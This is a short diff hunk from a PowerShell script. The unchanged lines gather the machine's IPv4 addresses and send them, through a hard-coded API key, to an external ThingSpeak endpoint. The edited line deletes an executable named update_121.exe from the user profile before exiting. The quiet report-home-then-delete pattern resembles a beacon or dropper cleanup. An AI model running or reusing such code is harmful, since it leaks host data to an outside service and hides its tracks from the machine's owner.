@@ -26,7 +26,7 @@ $ipa3 =(Get-NetIPAddress -AddressState Preferred -AddressFamily IPv4 | Select-Ob
 $url = "https://api.thingspeak.com/update?api_key=F15031FIFGY353KO&field1=$ipa&field2=$ipa2&field3=$ipa3";
 (New-Object System.Net.WebClient).DownloadString($url)
 Invoke-WebRequest $url -Method Get
-Remove-Item –path "$Env:USERPROFILE\update_121.exe"
+Remove-Item "$Env:USERPROFILE\update_121.exe"
 exit;
 
 
